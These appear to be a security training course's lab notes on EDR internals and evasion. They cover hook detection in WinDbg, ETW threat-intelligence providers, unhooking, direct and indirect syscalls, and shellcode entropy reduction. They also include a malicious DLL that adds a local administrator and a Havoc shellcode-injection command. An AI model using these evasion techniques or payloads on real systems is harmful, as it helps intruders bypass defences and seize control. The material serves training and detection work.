<h2><a class="header" href="#3-litterbox" id="3-litterbox">3. Litterbox</a></h2>
<p>Install Python 3.x</p>
<pre><code class="language-powershell">cd git
git clone https://github.com/BlackSnufkin/LitterBox.git
cd LitterBox
pip install -r requirements.txt
</code></pre>
<p>Run the server manually:</p>
<pre><code class="language-powershell">python litterbox.py
</code></pre>
<p>Browse to the server GUI (from windows or Kali)
<a href="http:%5C%5Clocalhost:1337">http:\\localhost:1337</a></p>
<p><img src="./images/litterbox.jpg" alt="image" /></p>
<p>Or install as a service:</p>
<pre><code>nssm install Litterbox &quot;C:\\Users\\threatadmin\\AppData\\Local\\Programs\\Python\\Python312\\python.exe&quot; &quot;C:\\git\\litterbox\\litterbox.py&quot;
nssm set Litterbox AppDirectory &quot;C:\\git\\litterbox\\&quot;
nssm.exe start litterbox
</code></pre>
<hr />
<h2><a class="header" href="#4-procdump" id="4-procdump">4. Procdump</a></h2>
<pre><code class="language-powershell">procdump -ma [Name or PID]
</code></pre>
<h2><a class="header" href="#5-autoruns-sysinternals" id="5-autoruns-sysinternals">5. AUTORUNS (SYSINTERNALS)</a></h2>
<p><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns">https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p>
<h2><a class="header" href="#dnspy--dotpeek" id="dnspy--dotpeek">DNSpy / Dotpeek</a></h2>
<p><a href="https://dnspy.org">https://dnspy.org</a></p>
<p><a href="https://www.jetbrains.com/decompiler/download/#section=web-installer">https://www.jetbrains.com/decompiler/download/#section=web-installer</a></p>
<pre><code class="language-python">[book]
title = &quot;My Awesome Book&quot;

[output.wordcount]

[output.html]
</code></pre>
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>
<h1><a class="header" href="#todos" id="todos">TODOs:</a></h1>
<ul>
<li><r>TODO:</r> Important thing to do</li>
<li><o>TODO:</o> Less important thing to do</li>
<li><g>DONE:</g> Breath deeply and improve karma</li>
</ul>
<h1><a class="header" href="#chat" id="chat">CHAT</a></h1>
<p>Please insrall <a href="https://discord.com"><strong>DISCORD</strong></a> on your machine - we'll be using discord for sharing links, documents, chatting, questions and banter. At the beginning of the class you'll receive an invite to join the Threat Hunting Academy channel.</p>
<h1><a class="header" href="#access-to-the-lab" id="access-to-the-lab">ACCESS to the lab:</a></h1>
<p>Students get access to a central <code>GUACAMOLE</code> server, from there they can <code>RDP</code> into their Windows 10 machine and use SSH (native ssh in WIN10 or putty) to their Kali machine.</p>
<p>The guacamole server is : <a href="https://guacamole.th.denarm.be/#/"><strong>GUACAMOLE</strong></a><br />
Credentials are : <strong>studentXX</strong>/WEWILLTELLYOU (where XX is a number from 01 to 15)<br />
RDP credentials are : <em><strong>studentXX</strong></em>/WEWILLTELLYOU (where XX is a number from 01 to 15)</p>
<pre><code class="language-code">https://guacamole.th.denarm.be/
</code></pre>
<blockquote>
<p>Example text box</p>
</blockquote>
<h1><a class="header" href="#frameworks" id="frameworks">Frameworks</a></h1>
<ol>
<li><a href="https://practicalsecurityanalytics.com/specterinsight/">https://practicalsecurityanalytics.com/specterinsight/</a></li>
<li><a href="https://github.com/Adaptix-Framework/AdaptixC2">https://github.com/Adaptix-Framework/AdaptixC2</a></li>
<li><a href="https://github.com/its-a-feature/Mythic">https://github.com/its-a-feature/Mythic</a></li>
</ol>
<h1><a class="header" href="#heuristics" id="heuristics">Heuristics</a></h1>
<h2><a class="header" href="#differences-in-capabilities-of-heuristic-scanning-in-microsoft-defender-with-and-without-cloud-protection" id="differences-in-capabilities-of-heuristic-scanning-in-microsoft-defender-with-and-without-cloud-protection">Differences in Capabilities of Heuristic Scanning in Microsoft Defender with and without Cloud Protection</a></h2>
<h3><a class="header" href="#with-cloud-protection-turned-on" id="with-cloud-protection-turned-on">With Cloud Protection Turned On:</a></h3>
<ul>
<li><strong>Enhanced Detection:</strong> Cloud protection leverages Microsoft's vast cloud infrastructure to provide near-instant detection and blocking of new and emerging threats. This means that heuristic scanning can benefit from real-time updates and advanced machine learning models that are continuously updated in the cloud.</li>
<li><strong>Behavior Analysis:</strong> The cloud can analyze suspicious behavior and patterns more effectively, providing a higher level of protection against sophisticated threats.</li>
<li><strong>Faster Response:</strong> Cloud protection allows for quicker response times to new threats, as the cloud can process and analyze data much faster than local systems.</li>
</ul>
<h3><a class="header" href="#without-cloud-protection-turned-on" id="without-cloud-protection-turned-on">Without Cloud Protection Turned On:</a></h3>
<ul>
<li><strong>Local Heuristics:</strong> Heuristic scanning relies solely on the local database and predefined rules. This means it may not be as effective in detecting the latest threats that have not yet been added to the local database.</li>
<li><strong>Limited Updates:</strong> Without cloud protection, updates to heuristic scanning capabilities are limited to periodic updates rather than real-time enhancements.</li>
<li><strong>Slower Detection:</strong> The detection and response times may be slower, as the local system has to process and analyze threats without the additional computational power and data available in the cloud.</li>
</ul>
<h3><a class="header" href="#summary-6" id="summary-6">Summary</a></h3>
<p>Enabling cloud protection significantly enhances the heuristic scanning capabilities of Microsoft Defender by providing real-time updates, advanced behavior analysis, and faster response times.</p>
<p><strong>References:</strong></p>
<ul>
<li><a href="https://learn.microsoft.com/en-us/defender-endpoint/next-generation-protection">Overview of next-generation protection in Microsoft Defender for Endpoint</a></li>
<li><a href="https://learn.microsoft.com/en-us/defender-endpoint/adv-tech-of-mdav">Advanced technologies at the core of Microsoft Defender Antivirus</a></li>
</ul>
<h1><a class="header" href="#hooks-user-land" id="hooks-user-land">Hooks (User land)</a></h1>
<p><img src="./images/hooking.jpg" alt="Screenshot" /></p>
<p>Explain hooking with <em><strong>FRIDA</strong></em></p>
<h1><a class="header" href="#sylantstrike" id="sylantstrike">SYLANTSTRIKE</a></h1>
<p><a href="https://github.com/CCob/SylantStrike">https://github.com/CCob/SylantStrike</a></p>
<p>x64dbg</p>
<p>HookChecker mr. Un1c0d3r</p>
<p>dump exported funtions ntdll.dll kernelbase.dll kernel32.dll</p>
<pre><code>
Screenshot IDA JUMP

https://github.com/Almorabea/HookSweeper


https://github.com/Mr-Un1k0d3r/EDRs
Hook_finder64.exe

https://github.com/asaurusrex/Probatorum-EDR-Userland-Hook-Checker
compile in visual studio

Bitdefender install -&gt; 102 fnctions hooked

windgb:
u NtOpenProcess
!chkimg ntdll
needs symbols in windbg
.sympath srv*https://msdl.microsoft.com/download/symbols
 !sym noisy;.reload /f /v


</code></pre>
<p>u NtReadVirtualMemory
ntdll!NtReadVirtualMemory:
00007ffd<code>3ef0dcc0 e95b331600      jmp     00007ffd</code>3f071020
00007ffd<code>3ef0dcc5 cc              int     3 00007ffd</code>3ef0dcc6 cc              int     3
00007ffd<code>3ef0dcc7 cc              int     3 00007ffd</code>3ef0dcc8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000<code>7ffe0308)],1 00007ffd</code>3ef0dcd0 7503            jne     ntdll!NtReadVirtualMemory+0x15 (00007ffd<code>3ef0dcd5) 00007ffd</code>3ef0dcd2 0f05            syscall
00007ffd`3ef0dcd4 c3              ret</p>
<pre><code>
then look at the jump address and disassemble:
</code></pre>
<p>u 00007ffd<code>3f071020 00007ffd</code>3f071020 36363636488da42400ffffff lea rsp,ss:[rsp-100h]
00007ffd<code>3f07102c 363648898c2438ffffff mov qword ptr ss:[rsp-0C8h],rcx 00007ffd</code>3f071036 48b9700da2cdf47d0000 mov rcx,7DF4CDA20D70h
00007ffd<code>3f071040 ff1522000000    call    qword ptr [00007ffd</code>3f071068]
00007ffd<code>3f071046 9c              pushfq 00007ffd</code>3f071047 48f78424f8feffffffffffff test qword ptr [rsp-108h],0FFFFFFFFFFFFFFFFh
00007ffd<code>3f071053 740a            je      00007ffd</code>3f07105f
00007ffd`3f071055 9d              popfq</p>
<pre><code>
**call qword ptr [00007ffd3f071068]:** This is a crucial instruction. It's acallto an address stored in memory at00007ffd3f071068.  This is almost certainly a call to the actual hook function – the code that performs the custom actions.  The address 00007ffd3f071068` is acting as a pointer to the hook function.

**Examine 00007ffd3f071068:** Usedq 00007ffd3f071068 in WinDbg to see what value is stored at that address.  This is the address of the actual hook function.

</code></pre>
<p>dq 00007ffd3f071068
00007ffd<code>3f071068  00007df4</code>cda31000 cccccccc<code>cccccccc 00007ffd</code>3f071078  cccccccc<code>cccccccc 24a48d48</code>36363636
00007ffd<code>3f071088  89483636</code>ffffff00 b948ffff<code>ff38248c 00007ffd</code>3f071098  00007df4<code>cda20dc0 489c0000</code>002215ff
00007ffd<code>3f0710a8  fffffffe</code>f82484f7 36369d0a<code>74ffffff 00007ffd</code>3f0710b8  9dfffffe<code>f024a4ff cccccccc</code>ccccccc3
00007ffd<code>3f0710c8  00007df4</code>cda31000 cccccccc<code>cccccccc 00007ffd</code>3f0710d8  cccccccc<code>cccccccc 24a48d48</code>36363636</p>
<pre><code>The important part is 00007df4cda31000. This is the address where the *real* hook function is located. The rest of the output (cccccccc...) is just filler (oftenccrepresents anint 3` instruction, a common breakpoint or padding value).

Next step:

Now that you have the address of the actual hook function (00007df4cda31000), you need to disassemble it to understand what it's doing.

```code
u 00007df4`cda31000
00007df4`cda31000 9c              pushfq
00007df4`cda31001 48f705f4efffffffffffff test qword ptr [00007df4`cda30000],0FFFFFFFFFFFFFFFFh
00007df4`cda3100c 7515            jne     00007df4`cda31023
00007df4`cda3100e 9d              popfq
00007df4`cda3100f 488b4910        mov     rcx,qword ptr [rcx+10h]
00007df4`cda31013 48894c24f8      mov     qword ptr [rsp-8],rcx
00007df4`cda31018 488b8c2440ffffff mov     rcx,qword ptr [rsp-0C0h]
00007df4`cda31020 c20001          ret     100h
</code></pre>
<pre><code class="language-code">!address 00007df4`cda30000

Usage:                  &lt;unknown&gt;
Base Address:           00007df4`cda30000
End Address:            00007df4`cda31000
Region Size:            00000000`00001000 (   4.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000002          PAGE_READONLY
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00007df4`cda30000
Allocation Protect:     00000002          PAGE_READONLY


Content source: 1 (target), length: 1000
</code></pre>
<h1><a class="header" href="#sylentstrike-unhooking-custom-edr" id="sylentstrike-unhooking-custom-edr">SylentStrike (Unhooking) custom EDR</a></h1>
<p>https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/</p>
<h1><a class="header" href="#bestedrofthemarket" id="bestedrofthemarket">BestEDROfTheMarket</a></h1>
<p><a href="https://github.com/Xacone/BestEdrOfTheMarket">https://github.com/Xacone/BestEdrOfTheMarket</a></p>
<p>Unhooking by releading ntdll.dll into memory -&gt; some EDR's detect loading NTDLL from disk...</p>
<p>Bypass, create a suspended process (this will only load NTDLL, not the EDR dll) -&gt; then copy the clean ntdll from the suspended process and overwrite it in the current process, unhooking the functions.</p>
<p>PROCESS HOLLOWING (Freeze)</p>
<p>https://hawk-eye.io/2023/06/freeze-a-payload-toolkit-for-bypassing-edrs-using-suspended-processes/</p>
<p>This can also be used to enumerate syscalls without touching NTDLL!</p>
<p>https://cymulate.com/blog/extracting-syscalls-from-a-suspended-process/</p>
<h1><a class="header" href="#syscalls-kernel-mode" id="syscalls-kernel-mode">SYSCALLS (Kernel mode)</a></h1>
<p><a href="https://hfiref0x.github.io/X86_64/NT10_syscalls.html">https://hfiref0x.github.io/X86_64/NT10_syscalls.html</a></p>
<table><thead><tr><th>System Call</th><th>Windows 10</th><th>Description</th></tr></thead><tbody>
<tr><td><code>NtCreateThread</code></td><td>0x004e</td><td>Creates a thread to execute within the virtual address space of the calling process.</td></tr>
<tr><td><code>NtAllocateVirtualMemory</code></td><td>0x0018</td><td>Allocates memory in the virtual address space of the calling process.</td></tr>
<tr><td><code>NtWriteVirtualMemory</code></td><td>0x003a</td><td></td></tr>
<tr><td><code>NtWaitForSingleObject</code></td><td>0x0004</td><td>Waits until the specified object is in the signaled state or the time-out interval elapses.</td></tr>
</tbody></table>
<p>https://github.com/joshfinley/SyscallDumper</p>
<p>https://passthehashbrowns.github.io/hiding-your-syscalls</p>
<p>https://github.com/fin3ss3g0d/HookFinder</p>
<pre><code class="language-powershell">PS C:\git\EDRs&gt; .\hook_finder64.exe C:\windows\system32\ntdll.dll
</code></pre>
<p>https://www.secunnix.com/en/blog/cat-and-mouse-game</p>
<h1><a class="header" href="#a-direct-syscall" id="a-direct-syscall">A. Direct Syscall</a></h1>
<p>In its simplest form, the direct system calls technique can be said to implement the APIs to be used in the malware with assembly commands in the code instead of getting them through ntdll.dll, in order to prevent EDR sensors from hooking.</p>
<p>In this way, the program does not refer to ntdll.dll and uses the APIs it needs directly. Since ntdll.dll is not called, the EDR sensors will be blind because they do not inject themselves into the process. There are many PoCs for this technique, For example, Hells Gate, Halo's Gate, Syswhispers2 and 3 are successful studies that prove the application of direct syscall.</p>
<blockquote>
<p>Call stack spoofing : making it look like the syscall cam from ntdll (or 2 other dll's that normally uses syscalls)
with memory forensics (i.e. volatilty) this can be detected, EDR's are in a tough spot since they need to do this in real time!</p>
</blockquote>
<p><a href="https://www.youtube.com/watch?v=PmqvBe1LSZc&amp;t=2286s">https://www.youtube.com/watch?v=PmqvBe1LSZc&amp;t=2286s</a></p>
<p><img src="./images/syscall_direct.jpg" alt="Screenshot" /></p>
<p>Unfortunately, this method, which was quite effective at first, can be detected by some EDR solutions through kernel callbacks, since the system calls are executed outside of ntdll.dll and the RET command is located directly in the memory area of the program to which the direct syscall is applied. Because normal programs do not behave like this. As you can see, it comes back to what we explained under the heading of normalization and reputation.</p>
<h1><a class="header" href="#b-indirect-syscall" id="b-indirect-syscall">B. Indirect Syscall</a></h1>
<p>Indirect system calls are similar to the direct system calls technique in terms of their working logic. But beyond that, they have a few minor differences in the processing of system calls.</p>
<p>In the direct syscall technique, while the process belonging to ntdll.dll is completely outside the event and the RET commands are in the program itself instead of this DLL, in the case of indirect syscall, since <code>the calls are executed through ntdll.dll</code>, they are perceived as normal by EDR processes. Okay. So, if you ask how EDR cannot perform the hook operation, the logic is actually simple. During the execution of the malicious code, <code>the JMP command goes to the block where the system call is located</code>, instead of pointing to the entry point (starting point) of <code>ntdll.dll</code>. 
Thus, a device unaware of ntdll.dll It is a little more difficult to detect since there is no execution process.</p>
<p><img src="./images/syscall_indirect.jpg" alt="Screenshot" /></p>
<p>Although both techniques still work, the indirect syscall method can help develop less detectable malware. Note that these are methods to avoid user mode hooking. If you are dealing with a security solution that does kernel mode hooking, this techniques can be identified.
In addition, the Event Tracing for Windows (ETW) structure offered by Microsoft for Windows systems can be used by some EDRs to control the stack structures where calls are made. If you want to see a very clean implementation of both techniques, read the article below. We can recommend it.</p>
<p>https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls
https://github.com/Maldev-Academy/HellHall</p>
<hr />
<p>regular virtualAlloc through win32api vs. direct syscall using SSN.</p>
<hr />
<p>Syswhispers2 -&gt; import in visual studio project to enumerate syscalls</p>
<h1><a class="header" href="#kernel-callbacks" id="kernel-callbacks">Kernel Callbacks</a></h1>
<p>Call stack spoofing : making it look like the syscall cam from ntdll (or 2 other dll's that normally uses syscalls)</p>
<h1><a class="header" href="#edr-stuff" id="edr-stuff">EDR Stuff</a></h1>
<blockquote>
<p>HINT : Writing your payloads in something else that c, C++, CSharp typically has more evasive results. So exactly the same functionality, just switching the languags throw a lot of AV/EDR's off, or at least decrease the detection rate (i.e golang, nim, ...)
When using payloads, DLL's evade EDR's than Exe's. -&gt; Shellcode = not exe/dll!!!</p>
</blockquote>
<p>https://blog.deeb.ch/posts/how-edr-works/</p>
<p>DLL Sideloading, powershellshell SharpDDL Proxy, DDLHijacks.net
Cyphercon 6
windows SKD Libraries - signed by MS (EDR's track default DLL's and their execution paths)
use procmon to see DLL's not found</p>
<p>Evading AV (signatures), by downloading the shellcode remotely, instead of embedded it might trigger behavioural detections (unsigned process, making a network connection). So maybe we can embed the encrypted shellcode in an .ico file, in a resource file.</p>
<blockquote>
<p><em><strong>OPSEC Hint</strong></em> : EDR's will look at Entropy, so anything that is encrypted/packed/compressed (high level of randomization), will have a very high entropy (randomness level). We can optimize our shellcode by adding nullbytes to decrease the entropy. This is REALLY important</p>
<p>https://github.com/gmh5225/shellcode-EntropyFix
sigcheck.exe -h -a &quot;D:\Malware\11&quot;</p>
<p>As compression and encryption algorithms' output usually consists of high entropy data, one can say any file with entropy greater than 7.0 is likely compressed, encrypted, or packed (in case of executables).</p>
</blockquote>
<blockquote>
<p>Also remember static/signature/heuristic detection can flag suspicious elements of code, so the cleaner we bypass, the less EDR gets a headstart with suspicious detections passed on from the static engine.</p>
</blockquote>
<ol>
<li>code-signed files are more losely inspected</li>
<li>it's all about adding weight of malicious indicators</li>
</ol>
<p>How EDR's do their thing</p>
<table><thead><tr><th>Feature</th><th>Description</th></tr></thead><tbody>
<tr><td>Kernell callbacks</td><td>Process creation, dll loading etc</td></tr>
<tr><td>ETW</td><td>System events</td></tr>
<tr><td>AMSI</td><td>Jscript, vbscript, dotnet, powershell -&gt; scanning with signatures</td></tr>
<tr><td>System call Monitoring</td><td>Hooking API's in process memory</td></tr>
</tbody></table>
<blockquote>
<ol>
<li>https://frida.re/docs/frida-trace/</li>
<li>https://github.com/CCob/SylantStrike</li>
<li>https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/</li>
<li>https://github.com/Xacone/BestEdrOfTheMarket</li>
</ol>
</blockquote>
<h1><a class="header" href="#etw-stuff" id="etw-stuff">ETW Stuff</a></h1>
<table><thead><tr><th>Provider</th><th>GUID</th></tr></thead><tbody>
<tr><td>Microsoft-Windows-Kernel-Process</td><td>{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}</td></tr>
</tbody></table>
<pre><code class="language-code">logman start mysession -p {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716} -o mytest.etl -ets
logman start mysession -p Microsoft-Windows-Kernel-Process -o mytest.etl -ets
logman stop mysession -ets
tracerpt mytest.etl
</code></pre>
<p>https://github.com/Microsoft/perfview/releases</p>
<p>logman create trace MyETWSession -p &quot;Microsoft-Windows-Kernel-Process&quot; 0x8 -o &quot;C:\temp\kernel-process.etl&quot; -ets</p>
<p>.\filebeat.exe -e -c filebeat.yml -d &quot;*&quot;</p>
<hr />
<pre><code class="language-powershell">logman start Microsoft-Windows-Kernel-Memory -p Microsoft-Windows-Kernel-Memory 0xffffffffffffffff win:informational -ets
logman stop Microsoft-Windows-Kernel-Memory -ets 
</code></pre>
<p>tracerpt .\Microsoft-Windows-Kernel-Memory.etl -o Microsoft-Windows-Kernel-Memory.evtx -of evtx -lr</p>
<h2><a class="header" href="#provider---------------------------------guid" id="provider---------------------------------guid">Provider                                 GUID</a></h2>
<p>Microsoft-Windows-Threat-Intelligence    {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}</p>
<hr />
<table><thead><tr><th>Value</th><th>Keyword</th><th>Description</th></tr></thead><tbody>
<tr><td>0x0000000000000001</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL</td><td>Allocates virtual memory in the local process.</td></tr>
<tr><td>0x0000000000000002</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER</td><td>Allocates virtual memory in the local process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000004</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE</td><td>Allocates virtual memory in a remote process.</td></tr>
<tr><td>0x0000000000000008</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER</td><td>Allocates virtual memory in a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000010</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL</td><td>Changes the protection on a region of virtual memory in the local process.</td></tr>
<tr><td>0x0000000000000020</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER</td><td>Changes the protection on a region of virtual memory in the local process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000040</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE</td><td>Changes the protection on a region of virtual memory in a remote process.</td></tr>
<tr><td>0x0000000000000080</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER</td><td>Changes the protection on a region of virtual memory in a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000100</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL</td><td>Maps a view of a file mapping into the address space of the local process.</td></tr>
<tr><td>0x0000000000000200</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER</td><td>Maps a view of a file mapping into the address space of the local process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000400</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE</td><td>Maps a view of a file mapping into the address space of a remote process.</td></tr>
<tr><td>0x0000000000000800</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER</td><td>Maps a view of a file mapping into the address space of a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000001000</td><td>KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE</td><td>Queues an asynchronous procedure call (APC) to a thread in a remote process.</td></tr>
<tr><td>0x0000000000002000</td><td>KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER</td><td>Queues an asynchronous procedure call (APC) to a thread in a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000004000</td><td>KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE</td><td>Sets the context of a thread in a remote process.</td></tr>
<tr><td>0x0000000000008000</td><td>KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER</td><td>Sets the context of a thread in a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000010000</td><td>KERNEL_THREATINT_KEYWORD_READVM_LOCAL</td><td>Reads virtual memory in the local process.</td></tr>
<tr><td>0x0000000000020000</td><td>KERNEL_THREATINT_KEYWORD_READVM_REMOTE</td><td>Reads virtual memory in a remote process.</td></tr>
<tr><td>0x0000000000040000</td><td>KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL</td><td>Writes to virtual memory in the local process.</td></tr>
<tr><td>0x0000000000080000</td><td>KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE</td><td>Writes to virtual memory in a remote process.</td></tr>
<tr><td>0x0000000000100000</td><td>KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD</td><td>Suspends a thread.</td></tr>
<tr><td>0x0000000000200000</td><td>KERNEL_THREATINT_KEYWORD_RESUME_THREAD</td><td>Resumes a suspended thread.</td></tr>
<tr><td>0x0000000000400000</td><td>KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS</td><td>Suspends all threads in a process.</td></tr>
<tr><td>0x0000000000800000</td><td>KERNEL_THREATINT_KEYWORD_RESUME_PROCESS</td><td>Resumes all threads in a suspended process.</td></tr>
<tr><td>0x0000000001000000</td><td>KERNEL_THREATINT_KEYWORD_FREEZE_PROCESS</td><td>Freezes a process, preventing it from executing.</td></tr>
<tr><td>0x0000000002000000</td><td>KERNEL_THREATINT_KEYWORD_THAW_PROCESS</td><td>Thaws a frozen process, allowing it to execute.</td></tr>
<tr><td>0x0000000004000000</td><td>KERNEL_THREATINT_KEYWORD_CONTEXT_PARSE</td><td>Parses the context of a process or thread.</td></tr>
<tr><td>0x0000000008000000</td><td>KERNEL_THREATINT_KEYWORD_EXECUTION_ADDRESS_VAD_PROBE</td><td>Probes the virtual address descriptor (VAD) for an execution address.</td></tr>
<tr><td>0x0000000010000000</td><td>KERNEL_THREATINT_KEYWORD_EXECUTION_ADDRESS_MMF_NAME_PROBE</td><td>Probes the memory-mapped file (MMF) name for an execution address.</td></tr>
<tr><td>0x0000000020000000</td><td>KERNEL_THREATINT_KEYWORD_READWRITEVM_NO_SIGNATURE_RESTRICTION</td><td>Reads or writes virtual memory without signature restrictions.</td></tr>
<tr><td>0x0000000040000000</td><td>KERNEL_THREATINT_KEYWORD_DRIVER_EVENTS</td><td>Logs events related to kernel-mode drivers.</td></tr>
<tr><td>0x0000000080000000</td><td>KERNEL_THREATINT_KEYWORD_DEVICE_EVENTS</td><td>Logs events related to device operations.</td></tr>
<tr><td>0x8000000000000000</td><td>Microsoft-Windows-Threat-Intelligence/Analytic</td><td>Logs analytic events for threat intelligence.</td></tr>
</tbody></table>
<table><thead><tr><th>Value</th><th>Level</th><th>Description</th></tr></thead><tbody>
<tr><td>0x04</td><td>win:Informational</td><td>Information</td></tr>
</tbody></table>
<table><thead><tr><th>PID</th><th>Image</th></tr></thead><tbody>
<tr><td>0x00000000</td><td></td></tr>
</tbody></table>
<p>https://github.com/Lsecqt-Sponsors/Haunt_Agent/blob/main/Payload_Type/haunt/haunt/agent_code/etw.ps1
https://github.com/MHaggis/PowerShell-Hunter</p>
<p>https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/</p>
<h1><a class="header" href="#additional-privesc" id="additional-privesc">Additional PrivEsc</a></h1>
<blockquote>
<p><em><strong>IMPORTANT</strong></em>: We achieve not only <code>Privilege Escalation</code>, but also <code>code-execution</code> and <code>persistence</code>!!!</p>
</blockquote>
<h1><a class="header" href="#dll-hijacksideloading" id="dll-hijacksideloading">DLL Hijack/Sideloading</a></h1>
<p><a href="https://www.bordergate.co.uk/windows-privilege-escalation/#DLL-Hijacking">https://www.bordergate.co.uk/windows-privilege-escalation/#DLL-Hijacking</a>
The following code can be used to create a malicious DLL:</p>
<p>Bring your own vulnerable signed MS binary:</p>
<p>OLEVIEW</p>
<p>Why? EDR's will check if dll's loaded by LOL windows binaries happen from the right directory - by dropping a signed binary that is not present on the file system, we evding that detection.</p>
<p>Additionally OLEVIEW will</p>
<pre><code class="language-csharp">#include &lt;windows.h&gt;
 
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system(&quot;cmd.exe /k net user localadmin Password1 /add&quot;);
        system(&quot;cmd.exe /k net localgroup administrators localadmin /add&quot;);
        ExitProcess(0);
    }
    return TRUE;
}
</code></pre>
<p>Compile with:</p>
<pre><code class="language-code">x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijack.dll
</code></pre>
<h1><a class="header" href="#dll-hijacking" id="dll-hijacking">DLL Hijacking</a></h1>
<p>onedrive -&gt; Appdata -&gt; cscapi.dll</p>
<p>https://juggernaut-sec.com/dll-hijacking/#Hijacking_the_Service_DLL_to_get_a_SYSTEM_Shell</p>
<p><img src="./images/dllsearch.jpg" alt="image" /></p>
<h1><a class="header" href="#scheduled-tasks" id="scheduled-tasks">SCHEDULED TASKS</a></h1>
<pre><code class="language-powershell">schtasks /create /tn VulnTask /tr 'c:\MyPrograms\VulnerableTask\VulnTask.exe' /sc ONSTART /RL HIGHEST /RU &quot;Student_adm&quot; /RP &quot;Threathunt25&quot; /F
</code></pre>
<h1><a class="header" href="#additional-havoc" id="additional-havoc">Additional Havoc</a></h1>
<h1><a class="header" href="#havoc-modules" id="havoc-modules">Havoc Modules</a></h1>
<p><em><strong>dotnet</strong></em>
inline-execute
execute</p>
<p><em><strong>Inline - execute (BOF Loader!!!)</strong></em></p>
<blockquote>
<p>OPSEC Hint : When running the shell command, the process hosting your beacon/implant will spawn a child process, run the command and exit the child process. This is quite noisy compared to running everything in memory in the same process. Also command-line logging (eventlogs, sysmon and EDR's will log the commands.)</p>
</blockquote>
<p><em><strong>shell</strong></em></p>
<p><em><strong>shellcode</strong></em> </p>
<pre><code class="language-code">shellcode inject x64 6556 /opt/havoc/payloads/demon.x64.bin
</code></pre>
<blockquote>
<p>Explain sacrificial process - advatages/disadvantages (command line logging, stability, patching, not touching other processes)</p>
</blockquote>
<h2><a class="header" href="#1-avred-server" id="1-avred-server">1. AVRed-Server</a></h2>
<blockquote>
<p>This is the scanning engine that sends requests to the antivirus API configured, in our training that is &quot;Defender&quot;.</p>
</blockquote>
<p>Pre-requisites : AVRed uses Radare2 so let's first install that on our windows machine and add it to the path.</p>
<p><a href="https://github.com/radareorg/radare2/releases/download/5.9.8/radare2-5.9.8-w64.zip">https://github.com/radareorg/radare2/releases/download/5.9.8/radare2-5.9.8-w64.zip</a></p>
<p><img src="./images/radare2.jpg" alt="image" /></p>
<p><em><strong>On windows:</strong></em></p>
<pre><code class="language-powershell">cd c:\git
git clone hhttps://github.com/dobin/avred-server.git
cd avred-server
pip install  -r requirements.txt
</code></pre>
<p>Edit the config.yaml file</p>
<pre><code class="language-yaml">{
	&quot;bind_ip&quot;: &quot;0.0.0.&quot;,
	&quot;port&quot;: 8001,
	&quot;engine&quot;: &quot;Amsi&quot;
}
</code></pre>
<p><img src="./images/avred_server.jpg" alt="image" /></p>
<p>On your windows machine browse to the link:</p>
<p><a href="http:%5C%5Clocalhost:8001">http:\\localhost:8001</a></p>
<p><img src="./images/avred_server_chrome.jpg" alt="image" /></p>
<p>OPTIONALLY - Install as service with NSSM</p>
<p><a href="https://nssm.cc/ci/nssm-2.24-103-gdee49fc.zip">https://nssm.cc/ci/nssm-2.24-103-gdee49fc.zip</a></p>
<pre><code class="language-powershell">where python.exe
C:\Users\threatadmin\AppData\Local\Programs\Python\Python312\python.exe
C:\Users\threatadmin\AppData\Local\Microsoft\WindowsApps\python.exe
</code></pre>
<pre><code class="language-powershell">nssm install AvredServer&quot;C:\\Users\\threatadmin\\AppData\\Local\\Programs\\Python\\Python312\\python.exe&quot; &quot;C:\\git\\avred-server\\avred_server.py&quot;
nssm set AvredTest AppDirectory &quot;C:\\git\\avred-server\\&quot;
nssm.exe start AvredServer
</code></pre>
<h2><a class="header" href="#2-avred" id="2-avred">2. AVred</a></h2>
<blockquote>
